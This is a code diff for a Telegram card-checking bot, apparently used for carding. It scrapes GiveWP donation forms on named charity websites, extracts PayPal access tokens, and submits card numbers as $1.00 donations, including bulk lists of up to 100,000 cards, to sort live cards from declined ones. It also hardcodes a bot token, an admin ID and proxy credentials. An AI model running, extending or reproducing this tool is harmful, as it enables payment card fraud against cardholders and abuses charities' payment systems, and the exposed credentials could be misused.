@@ -35,26 +35,8 @@ fake = Faker('en_US')
 # --- CONFIGURATION ---
 BOT_NAME = "@nasahoker_bot"
 DEV_NAME = "@xenlize"
-ADMIN_ID = os.getenv("ADMIN_ID", "6193794414")  # Set in Railway environment variables
-TOKEN = os.getenv("BOT_TOKEN")  # MUST be set in Railway environment variables
-
-if not TOKEN:
-    print("ERROR: BOT_TOKEN environment variable not set!")
-    print("Please set BOT_TOKEN in Railway dashboard → Variables")
-    exit(1)
-
-# --- MULTIPLE SITES FOR REDUNDANCY ---
-DONATION_SITES = [
-    "scienceforthechurch.org",
-    "christianaid.ie",
-    "lifewithoutlimbs.org",
-    "thedocumentaryfund.org",
-    "wycliffe.ca",
-    "princessforaday.org",
-    "pcnc.org",
-    "bgcrusk.com",
-    "sfts.org.uk"
-]
+ADMIN_ID = "6193794414"
+TOKEN = "8304090513:AAGtSpPGBAhFoOG2S8_T9q0Uou0YCfVSj74"
 
 # --- PROXY LIST (REMOVED) ---
 PROXIES = ["geo.iproyal.com:12321:Aprimebd10:Aprimebd1010_country-us"]
@@ -139,61 +121,28 @@ def get_bin_info_sync(cc):
 
     return {"info": "VISA - DEBIT - CLASSIC", "bank": "CHASE BANK", "country": "UNITED STATES 🇺🇸"}
 
-# --- IMPROVED GATES WITH MULTI-SITE SUPPORT ---
+# --- GATES ---
 class PayPalCommerce:
     def __init__(self, proxy=None):
         self.r = requests.Session()
         self.ua = generate_user_agent()
-        self.url = None
-        self.working_site = None
+        self.url = "https://princessforaday.org/donations/custom-donation/"
         
     def Key(self):
-        # Try multiple sites until one works
-        for site in DONATION_SITES:
-            # Try different common donation page paths
-            donation_paths = ['/donate/', '/donations/', '/donations/custom-donation/']
-            
-            for path in donation_paths:
-                try:
-                    self.url = site
-                    self.donate_path = path
-                    self.r.proxies = {}
-                    headers = {'user-agent': self.ua}
-                    response = self.r.get(f'https://{self.url}{path}', headers=headers, timeout=10)
-                    
-                    if response.status_code != 200:
-                        continue
-                    
-                    # Check if this page uses PayPal Commerce (GiveWP)
-                    if 'give-form' not in response.text and 'paypal-commerce' not in response.text:
-                        continue
-                        
-                    self.id_form1 = re.search(r'name="give-form-id-prefix" value="(.*?)"', response.text)
-                    self.id_form2 = re.search(r'name="give-form-id" value="(.*?)"', response.text)
-                    self.nonec = re.search(r'name="give-form-hash" value="(.*?)"', response.text)
-                    enc = re.search(r'"data-client-token":"(.*?)"',response.text)
-                    
-                    if not all([self.id_form1, self.id_form2, self.nonec, enc]):
-                        continue
-                    
-                    self.id_form1 = self.id_form1.group(1)
-                    self.id_form2 = self.id_form2.group(1)
-                    self.nonec = self.nonec.group(1)
-                    enc = enc.group(1)
-                    
-                    dec = base64.b64decode(enc).decode('utf-8')
-                    au_match = re.search(r'"accessToken":"(.*?)"', dec)
-                    if not au_match:
-                        continue
-                        
-                    self.au = au_match.group(1)
-                    self.working_site = site
-                    print(f"✅ Using: {site}{path}")  # Debug log
-                    return True
-                except Exception as e:
-                    continue
-        
-        return False
+        # Direct connection only
+        try:
+            self.r.proxies = {}
+            headers = {'user-agent': self.ua}
+            response = self.r.get(f'https://{self.url}/donations/custom-donation/', headers=headers, timeout=15)
+            self.id_form1 = re.search(r'name="give-form-id-prefix" value="(.*?)"', response.text).group(1)
+            self.id_form2 = re.search(r'name="give-form-id" value="(.*?)"', response.text).group(1)
+            self.nonec = re.search(r'name="give-form-hash" value="(.*?)"', response.text).group(1)
+            enc = re.search(r'"data-client-token":"(.*?)"',response.text).group(1)
+            dec = base64.b64decode(enc).decode('utf-8')
+            self.au = re.search(r'"accessToken":"(.*?)"', dec).group(1)
+            return True
+        except Exception:
+            return False
         
     def Krs(self, ccx):
         ccx=ccx.strip()
@@ -202,26 +151,23 @@ class PayPalCommerce:
         n, mm, yy, cvc = parts[0], parts[1].zfill(2), parts[2], parts[3] if len(parts) > 3 else "000"
         if len(yy) == 4: yy = yy[2:]
         
-        if not self.url or not hasattr(self, 'donate_path'):
-            return "CONNECTION_ERROR"
-        
         try:
             headers = {
                 'origin': f'https://{self.url}',
-                'referer': f'https://{self.url}{self.donate_path}',
+                'referer': f'https://{self.url}/donate/',
                 'user-agent': self.ua,
                 'x-requested-with': 'XMLHttpRequest',
             }
             data = {
-                'give-honeypot': '', 'give-form-id-prefix': self.id_form1, 'give-form-id': self.id_form2, 'give-form-title': '', 'give-current-url': f'https://{self.url}{self.donate_path}', 'give-form-url': f'https://{self.url}{self.donate_path}', 'give-form-minimum': '1.00', 'give-form-maximum': '999999.99', 'give-form-hash': self.nonec, 'give-price-id': '3', 'give-recurring-logged-in-only': '', 'give-logged-in-only': '1', '_give_is_donation_recurring': '0', 'give_recurring_donation_details': '{"give_recurring_option":"yes_donor"}', 'give-amount': '1.00', 'give_stripe_payment_method': '', 'payment-mode': 'paypal-commerce', 'give_first': 'DRGAM', 'give_last': 'rights and', 'give_email': 'drgam22@gmail.com', 'card_name': 'drgam ', 'card_exp_month': '', 'card_exp_year': '', 'give_action': 'purchase', 'give-gateway': 'paypal-commerce', 'action': 'give_process_donation', 'give_ajax': 'true',
+                'give-honeypot': '', 'give-form-id-prefix': self.id_form1, 'give-form-id': self.id_form2, 'give-form-title': '', 'give-current-url': f'https://{self.url}/donate/', 'give-form-url': f'https://{self.url}/donate/', 'give-form-minimum': '1.00', 'give-form-maximum': '999999.99', 'give-form-hash': self.nonec, 'give-price-id': '3', 'give-recurring-logged-in-only': '', 'give-logged-in-only': '1', '_give_is_donation_recurring': '0', 'give_recurring_donation_details': '{"give_recurring_option":"yes_donor"}', 'give-amount': '1.00', 'give_stripe_payment_method': '', 'payment-mode': 'paypal-commerce', 'give_first': 'DRGAM', 'give_last': 'rights and', 'give_email': 'drgam22@gmail.com', 'card_name': 'drgam ', 'card_exp_month': '', 'card_exp_year': '', 'give_action': 'purchase', 'give-gateway': 'paypal-commerce', 'action': 'give_process_donation', 'give_ajax': 'true',
             }
-            self.r.post(f'https://{self.url}/wp-admin/admin-ajax.php', headers=headers, data=data, timeout=10)
+            self.r.post(f'https://{self.url}/wp-admin/admin-ajax.php', headers=headers, data=data, timeout=15)
             
             data_multipart = MultipartEncoder({
-                'give-honeypot': (None, ''), 'give-form-id-prefix': (None, self.id_form1), 'give-form-id': (None, self.id_form2), 'give-form-title': (None, ''), 'give-current-url': (None, f'https://{self.url}{self.donate_path}'), 'give-form-url': (None, f'https://{self.url}{self.donate_path}'), 'give-form-minimum': (None, '1.00'), 'give-form-maximum': (None, '999999.99'), 'give-form-hash': (None, self.nonec), 'give-price-id': (None, '3'), 'give-recurring-logged-in-only': (None, ''), 'give-logged-in-only': (None, '1'), '_give_is_donation_recurring': (None, '0'), 'give_recurring_donation_details': (None, '{"give_recurring_option":"yes_donor"}'), 'give-amount': (None, '1.00'), 'give_stripe_payment_method': (None, ''), 'payment-mode': (None, 'paypal-commerce'), 'give_first': (None, 'DRGAM'), 'give_last': (None, 'rights and'), 'give_email': (None, 'drgam22@gmail.com'), 'card_name': (None, 'drgam '), 'card_exp_month': (None, ''), 'card_exp_year': (None, ''), 'give-gateway': (None, 'paypal-commerce'),
+                'give-honeypot': (None, ''), 'give-form-id-prefix': (None, self.id_form1), 'give-form-id': (None, self.id_form2), 'give-form-title': (None, ''), 'give-current-url': (None, f'https://{self.url}/donate/'), 'give-form-url': (None, f'https://{self.url}/donate/'), 'give-form-minimum': (None, '1.00'), 'give-form-maximum': (None, '999999.99'), 'give-form-hash': (None, self.nonec), 'give-price-id': (None, '3'), 'give-recurring-logged-in-only': (None, ''), 'give-logged-in-only': (None, '1'), '_give_is_donation_recurring': (None, '0'), 'give_recurring_donation_details': (None, '{"give_recurring_option":"yes_donor"}'), 'give-amount': (None, '1.00'), 'give_stripe_payment_method': (None, ''), 'payment-mode': (None, 'paypal-commerce'), 'give_first': (None, 'DRGAM'), 'give_last': (None, 'rights and'), 'give_email': (None, 'drgam22@gmail.com'), 'card_name': (None, 'drgam '), 'card_exp_month': (None, ''), 'card_exp_year': (None, ''), 'give-gateway': (None, 'paypal-commerce'),
             })
             headers['content-type'] = data_multipart.content_type
-            response = self.r.post(f'https://{self.url}/wp-admin/admin-ajax.php', params={'action': 'give_paypal_commerce_create_order'}, headers=headers, data=data_multipart, timeout=10)
+            response = self.r.post(f'https://{self.url}/wp-admin/admin-ajax.php', params={'action': 'give_paypal_commerce_create_order'}, headers=headers, data=data_multipart, timeout=15)
             tok = response.json()['data']['id']
             
             headers_paypal = {
@@ -230,22 +176,21 @@ class PayPalCommerce:
             json_data = {
                 'payment_source': {'card': {'number': n, 'expiry': f'20{yy}-{mm}', 'security_code': cvc, 'attributes': {'verification': {'method': 'SCA_WHEN_REQUIRED'}}}}, 'application_context': {'vault': False},
             }
-            self.r.post(f'https://cors.api.paypal.com/v2/checkout/orders/{tok}/confirm-payment-source', headers=headers_paypal, json=json_data, timeout=10)
+            self.r.post(f'https://cors.api.paypal.com/v2/checkout/orders/{tok}/confirm-payment-source', headers=headers_paypal, json=json_data, timeout=15)
                 
             data_approve = MultipartEncoder({
-                'give-honeypot': (None, ''), 'give-form-id-prefix': (None, self.id_form1), 'give-form-id': (None, self.id_form2), 'give-form-title': (None, ''), 'give-current-url': (None, f'https://{self.url}{self.donate_path}'), 'give-form-url': (None, f'https://{self.url}{self.donate_path}'), 'give-form-minimum': (None, '1.00'), 'give-form-maximum': (None, '999999.99'), 'give-form-hash': (None, self.nonec), 'give-price-id': (None, '3'), 'give-recurring-logged-in-only': (None, ''), 'give-logged-in-only': (None, '1'), '_give_is_donation_recurring': (None, '0'), 'give_recurring_donation_details': (None, '{"give_recurring_option":"yes_donor"}'), 'give-amount': (None, '1.00'), 'give_stripe_payment_method': (None, ''), 'payment-mode': (None, 'paypal-commerce'), 'give_first': (None, 'DRGAM'), 'give_last': (None, 'rights and'), 'give_email': 'drgam22@gmail.com', 'card_name': 'drgam ', 'card_exp_month': '', 'card_exp_year': '', 'give-gateway': 'paypal-commerce',
+                'give-honeypot': (None, ''), 'give-form-id-prefix': (None, self.id_form1), 'give-form-id': (None, self.id_form2), 'give-form-title': (None, ''), 'give-current-url': (None, f'https://{self.url}/donate/'), 'give-form-url': (None, f'https://{self.url}/donate/'), 'give-form-minimum': (None, '1.00'), 'give-form-maximum': (None, '999999.99'), 'give-form-hash': (None, self.nonec), 'give-price-id': (None, '3'), 'give-recurring-logged-in-only': (None, ''), 'give-logged-in-only': (None, '1'), '_give_is_donation_recurring': (None, '0'), 'give_recurring_donation_details': (None, '{"give_recurring_option":"yes_donor"}'), 'give-amount': (None, '1.00'), 'give_stripe_payment_method': (None, ''), 'payment-mode': (None, 'paypal-commerce'), 'give_first': (None, 'DRGAM'), 'give_last': (None, 'rights and'), 'give_email': 'drgam22@gmail.com', 'card_name': 'drgam ', 'card_exp_month': '', 'card_exp_year': '', 'give-gateway': 'paypal-commerce',
             })
             headers['content-type'] = data_approve.content_type
-            response = self.r.post(f'https://{self.url}/wp-admin/admin-ajax.php', params={'action': 'give_paypal_commerce_approve_order', 'order': tok}, headers=headers, data=data_approve, timeout=10)
+            response = self.r.post(f'https://{self.url}/wp-admin/admin-ajax.php', params={'action': 'give_paypal_commerce_approve_order', 'order': tok}, headers=headers, data=data_approve, timeout=15)
             
             text = response.text
             if 'true' in text or 'sucsess' in text: return "Charge !"
-            elif 'INSUFFICIENT_FUNDS' in text: return "Approved! - INSUFFICIENT_FUNDS"
             elif 'DO_NOT_HONOR' in text: return "DO_NOT_HONOR"
             elif 'ACCOUNT_CLOSED' in text: return "ACCOUNT_CLOSED"
             elif 'PAYER_ACCOUNT_LOCKED_OR_CLOSED' in text: return "ACCOUNT_CLOSED"
             elif 'LOST_OR_STOLEN' in text: return "LOST OR STOLEN"
-            elif 'CVV2_FAILURE' in text: return "CVV MISMATCH ✅"
+            elif 'CVV2_FAILURE' in text: return "CVV2_FAILURE"
             elif 'SUSPECTED_FRAUD' in text: return "SUSPECTED_FRAUD"
             elif 'INVALID_ACCOUNT' in text: return 'INVALID_ACCOUNT'
             elif 'REATTEMPT_NOT_PERMITTED' in text: return "REATTEMPT_NOT_PERMITTED"
@@ -253,117 +198,75 @@ class PayPalCommerce:
             elif 'ORDER_NOT_APPROVED' in text: return 'ORDER_NOT_APPROVED'
             elif 'PICKUP_CARD_SPECIAL_CONDITIONS' in text: return 'PICKUP_CARD_SPECIAL_CONDITIONS'
             elif 'PAYER_CANNOT_PAY' in text: return "PAYER CANNOT PAY"
-            elif 'EXPIRED_CARD' in text: return "EXPIRED_CARD"
-            elif 'INVALID_CARD_NUMBER' in text: return "INVALID_CARD"
-            elif 'CARD_TYPE_NOT_SUPPORTED' in text: return "CARD_TYPE_NOT_SUPPORTED"
-            else: return text[:100] if text else "DECLINED"
-        except requests.exceptions.Timeout:
-            return "TIMEOUT_ERROR"
-        except requests.exceptions.ConnectionError:
-            return "CONNECTION_ERROR"
-        except Exception as e:
-            return f"ERROR: {str(e)[:50]}"
+            elif 'INSUFFICIENT_FUNDS' in text: return 'INSUFFICIENT_FUNDS'
+            elif 'GENERIC_DECLINE' in text: return 'GENERIC_DECLINE'
+            elif 'COMPLIANCE_VIOLATION' in text: return "COMPLIANCE_VIOLATION"
+            elif 'TRANSACTION_NOT PERMITTED' in text: return "TRANSACTION_NOT_PERMITTED"
+            elif 'PAYMENT_DENIED' in text: return 'PAYMENT_DENIED'
+            elif 'INVALID_TRANSACTION' in text: return "INVALID_TRANSACTION"
+            elif 'RESTRICTED_OR_INACTIVE_ACCOUNT' in text: return "RESTRICTED_OR_INACTIVE_ACCOUNT"
+            elif 'SECURITY_VIOLATION' in text: return 'SECURITY_VIOLATION'
+            elif 'DECLINED_DUE_TO_UPDATED_ACCOUNT' in text: return "DECLINED DUE TO UPDATED ACCOUNT"
+            elif 'INVALID_OR_RESTRICTED_CARD' in text: return "INVALID CARD"
+            elif 'EXPIRED_CARD' in text: return "EXPIRED CARD"
+            elif 'CRYPTOGRAPHIC_FAILURE' in text: return "CRYPTOGRAPHIC FAILURE"
+            elif 'TRANSACTION_CANNOT_BE_COMPLETED' in text: return "TRANSACTION CANNOT BE COMPLETED"
+            elif 'DECLINED_PLEASE_RETRY' in text: return "DECLINED PLEASE RETRY LATER"
+            elif 'TX_ATTEMPTS_EXCEED_LIMIT' in text: return "EXCEED LIMIT"
+            else:
+                try: return response.json()['data']['error']
+                except: return "UNKNOWN_ERROR"
+        except Exception: return "CONNECTION_ERROR"
 
-def format_response(cc, res, bin_info, time_taken, gate_name):
-    return f"""
-<b>━━━━━━━━━━━━━━━━━━━━
-{gate_name}
-━━━━━━━━━━━━━━━━━━━━</b>
+# --- FORMATTING ---
+def format_response(cc, result_text, bin_info, time_taken, gate_name="#PayPal_Charge $1.00 🔥"):
+    status_text = "𝐂𝐡𝐚𝐫𝐠𝐞𝐝 🔥" if 'Charge' in result_text else "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅" if 'INSUFFICIENT_FUNDS' in result_text or 'Approved' in result_text or 'CVV' in result_text else f"𝐎𝐑𝐃𝐄𝐑 𝐍𝐎𝐓 𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃 ❌ ({result_text})" if result_text != "DECLINED" else "𝐎𝐑𝐃𝐄𝐑 𝐍𝐎𝐓 𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃 ❌"
+    header = f"{gate_name} [/chk]"
+    return f"<b>{header}</b>\n- - - - - - - - - - - - - - - - - - - - - - -\nϟ 𝐂𝐚𝐫𝐝: <code>{cc}</code>\nϟ 𝐒𝐭𝐚𝐭𝐮𝐬: {status_text}\nϟ 𝐆𝐚𝐭𝐞: {gate_name}\n- - - - - - - - - - - - - - - - - - - - - - -\nϟ 𝐁𝐈𝐍 𝐈𝐧𝐟𝐨 → {bin_info['info']}\nϟ 𝐁𝐚𝐧𝐤 → {bin_info['bank']}\nϟ 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 → {bin_info['country']}\n- - - - - - - - - - - - - - - - - - - - - - -\n⌥ 𝐓𝐢𝐦𝐞: {time_taken}'s\n- - - - - - - - - - - - - - - - - - - - - - -\n⌤ 𝐃𝐞𝐯 𝐛𝐲: {DEV_NAME} - 🍀"
 
-<b>💳 Card:</b> <code>{cc}</code>
-
-<b>📊 Status:</b> <code>{res}</code>
-
-<b>🏦 BIN Info:</b>
-<code>{bin_info['info']}</code>
-<code>{bin_info['bank']}</code>
-<code>{bin_info['country']}</code>
-
-<b>⏱️ Time:</b> <code>{time_taken}s</code>
-<b>⚙️ Checked by:</b> {BOT_NAME}
-<b>👤 Dev:</b> {DEV_NAME}
-━━━━━━━━━━━━━━━━━━━━
-"""
+# --- COMMANDS ---
+def start(update, context):
+    user_id = update.effective_user.id
+    if user_id not in all_users:
+        all_users.append(user_id)
+        save_data(ALL_USERS_FILE, all_users)
+    
+    welcome = f"<b>✨ 𝖶𝖾𝗅𝖼𝗈𝗆𝖾 𝗍𝗈 {BOT_NAME.upper()} ✨</b>\n━━━━━━━━━━━━━━\n👤 <b>𝖴𝗌𝖾𝗋 𝖨𝖣:</b> <code>{user_id}</code>\n🛡️ <b>𝖲𝗍𝖺𝗍𝗎𝗌:</b> 𝐅𝐑𝐄𝐄 👤 (Full Access)\n━━━━━━━━━━━━━━\nϟ <b>𝖢𝗈𝗆𝗆𝖺𝗇𝖽𝗌:</b>\n  • /chk <code>𝖼𝖼|𝗆𝗆|𝗒𝗒|𝖼𝗏𝗏</code> (#PayPal_Charge $1.00🔥) [🟢 <b>ON</b>]\n  • /info (Check your info) [🆓 <b>FREE</b>]\n  • /gen <code>𝖻𝗂𝗇</code> (Generate Cards) [🆓 <b>FREE</b>]\n  • /stop (Stop all active checks)\n  • 𝖲𝖾𝗇𝖽 <code>.𝗍𝗑𝗍</code> 𝖿𝗈𝗋 𝖢𝗈𝗆𝖻𝗈\n━━━━━━━━━━━━━━\n⌤ 𝐃𝐞𝐯 𝐛𝐲: {DEV_NAME} - 🍀"
+    update.message.reply_text(welcome, parse_mode=ParseMode.HTML)
 
 def chk_command(update, context):
     uid = update.effective_user.id
-    chat_id = update.effective_chat.id
-    
-    if not check_access(uid, chat_id):
-        update.message.reply_text("❌ Access Denied!")
-        return
-    
-    if uid not in all_users:
-        all_users.append(uid)
-        save_data(ALL_USERS_FILE, all_users)
-    
     if not context.args:
-        update.message.reply_text("❌ <b>Invalid Format!</b>\n\n<b>Usage:</b> <code>/chk cc|mm|yy|cvv</code>", parse_mode=ParseMode.HTML)
+        update.message.reply_text("Usage: /chk cc|mm|yy|cvv")
         return
     
-    cc = context.args[0].strip()
-    user_name = get_user_name(update)
-    
-    gate_name = "#PayPal_Charge $1.00 🔥"
-    msg = update.message.reply_text(f"<b>⏳ Processing...</b>\n<code>{cc}</code>", parse_mode=ParseMode.HTML)
+    cc = context.args[0]
+    status_msg = update.message.reply_text("<b>Checking... ⏳</b>", parse_mode=ParseMode.HTML)
     
     start_time = time.time()
     gate = PayPalCommerce()
-    
     if not gate.Key():
-        msg.edit_text(f"<b>❌ All donation sites are down!</b>\n\nPlease try again later.", parse_mode=ParseMode.HTML)
+        status_msg.edit_text("❌ Connection Error! Try again.")
         return
-    
     res = gate.Krs(cc)
-    time_taken = round(time.time() - start_time, 2)
-    
-    is_hit = False
-    if 'Charge' in res:
-        stats_data['charged'] += 1
-        update_user_stats(uid, user_name, "charged")
-        is_hit = True
-    elif 'INSUFFICIENT_FUNDS' in res or 'Approved' in res or 'CVV' in res:
-        stats_data['approved'] += 1
-        update_user_stats(uid, user_name, "approved")
-        is_hit = True
-    else:
-        stats_data['declined'] += 1
-    
-    stats_data['total'] += 1
-    save_data(STATS_FILE, stats_data)
-    
     bin_info = get_bin_info_sync(cc)
-    msg.edit_text(format_response(cc, res, bin_info, time_taken, gate_name), parse_mode=ParseMode.HTML)
-
-def start(update, context):
-    uid = update.effective_user.id
-    if uid not in all_users:
-        all_users.append(uid)
-        save_data(ALL_USERS_FILE, all_users)
+    time_taken = round(time.time() - start_time, 1)
     
-    msg = f"""✨ <b>Welcome to {BOT_NAME}</b> ✨
-━━━━━━━━━━━━━━
-
-<b>👤 User ID:</b> <code>{uid}</code>
-<b>🛡️ Status:</b> 𝐅𝐑𝐄𝐄 👤 (Full Access)
-
-━━━━━━━━━━━━━━
-⚡ <b>Commands:</b>
-• <code>/chk cc|mm|yy|cvv</code> (#PayPal_Charge $1.00 🔥) [🟢 ON]
-• <code>/info</code> (Check your Info) [🆓 FREE]
-• <code>/gen bin</code> (Generate Cards) [🆓 FREE]
-• <code>/stop</code> (Stop all active checks)
-• Send <code>.txt</code> for Combo
-
-━━━━━━━━━━━━━━
-⌤ <b>Dev by:</b> {DEV_NAME}
-"""
-    update.message.reply_text(msg, parse_mode=ParseMode.HTML)
+    status_msg.edit_text(format_response(cc, res, bin_info, time_taken), parse_mode=ParseMode.HTML)
+    
+    if 'Charge' in res: 
+        update_user_stats(uid, get_user_name(update), "charged")
+        try: context.bot.pin_chat_message(update.effective_chat.id, status_msg.message_id)
+        except: pass
+    elif 'INSUFFICIENT_FUNDS' in res or 'Approved' in res or 'CVV' in res:
+        update_user_stats(uid, get_user_name(update), "approved")
+        try: context.bot.pin_chat_message(update.effective_chat.id, status_msg.message_id)
+        except: pass
 
 def info_command(update, context):
     user = update.effective_user
     user_id = user.id
-    username = f"@{user.username}" if user.username else "No Username"
+    username = f"@{user.username}" if user.username else "None"
     full_name = f"{user.first_name} {user.last_name or ''}".strip()
     
     msg = f"<b>👤 User Information:</b>\n━━━━━━━━━━━━━━\n🆔 <b>ID:</b> <code>{user_id}</code>\n👤 <b>Username:</b> {username}\n📛 <b>Name:</b> {full_name}\n🛡️ <b>Status:</b> 𝐅𝐑𝐄𝐄 👤 (Full Access)\n━━━━━━━━━━━━━━\n⌤ 𝐃𝐞𝐯 𝐛𝐲: {DEV_NAME}"
@@ -378,7 +281,7 @@ def info_command(update, context):
         update.message.reply_text(msg, parse_mode=ParseMode.HTML)
 
 def stats_command(update, context):
-    if str(update.effective_user.id) != ADMIN_ID: return
+    if update.effective_user.id != ADMIN_ID: return
     msg = "<b>📊 Bot Statistics:</b>\n━━━━━━━━━━━━━━\n"
     if "user_stats" in stats_data:
         for uid, data in stats_data["user_stats"].items():
@@ -387,7 +290,7 @@ def stats_command(update, context):
     update.message.reply_text(msg, parse_mode=ParseMode.HTML)
 
 def ntf_command(update, context):
-    if str(update.effective_user.id) != ADMIN_ID: return
+    if update.effective_user.id != ADMIN_ID: return
     if not context.args:
         update.message.reply_text("Usage: /ntf [message]")
         return
@@ -490,7 +393,7 @@ def handle_doc(update, context):
     with open(path, "r") as file: cards = [l.strip() for l in file.read().splitlines() if l.strip()]
     os.remove(path)
     
-    if uid != int(ADMIN_ID) and len(cards) > 100000:
+    if uid != ADMIN_ID and len(cards) > 100000:
         update.message.reply_text("⚠️ <b>Limit:</b> Free users can only check up to 100000 cards per file. Truncating list...", parse_mode=ParseMode.HTML)
         cards = cards[:100000]
             
